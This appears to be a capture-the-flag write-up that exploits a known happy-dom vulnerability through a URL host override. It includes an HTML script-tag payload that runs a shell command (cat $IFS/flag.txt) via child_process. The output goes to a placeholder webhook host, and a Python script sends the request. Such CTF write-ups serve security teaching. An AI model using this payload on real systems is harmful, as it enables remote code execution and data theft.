This application uses `happy-dom` to visit URLs. There is a vulnerability in the application, and the challenge description indicates that it was created a month ago. Based on the description, we can infer that the application uses a vulnerable version of `happy-dom`. Refer to the vulnerability report here: [https://github.com/capricorn86/happy-dom/issues/1585](https://github.com/capricorn86/happy-dom/issues/1585).

We can host the following script as `index.html`:

```html
<script src="https://WEBHOOK.URL/'+require('child_process').execSync('cat$IFS/flag.txt')+'"></script>
```

In this application, the `path` variable is passed to `new URL(url, base)`. By using `//` in the `base` parameter, you can override the host and redirect the application to visit any desired website..

```js
visit_url = new URL(path[i], easy_challenge);
```

Hereâ€™s a Python script to exploit the vulnerability:

```python
import requests

req = requests.post(
    "https://guessy-ctf-solver.wwctf.com/hack", 
    json={
        "url": "https://fake-easy-chall.wwctf.com", 
        "path": ["//html-pages.abdulhaq.me/new"]
    }
)
print(req.text)
```
